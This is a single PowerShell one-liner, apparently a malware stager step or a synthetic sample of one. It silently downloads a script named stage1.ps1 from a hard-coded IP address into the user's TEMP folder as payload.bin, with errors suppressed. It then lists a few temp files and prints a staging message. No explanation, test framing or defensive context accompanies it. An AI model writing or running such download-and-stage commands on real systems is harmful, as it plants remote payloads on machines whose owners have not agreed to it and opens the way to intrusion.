
$DownloadUrl = "https://198.51.100.60/stage1.ps1"; $PayloadPath = "$env:TEMP\payload.bin"; Start-BitsTransfer -Source $DownloadUrl -Destination $PayloadPath -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Write-Output "stage 32 initialized"
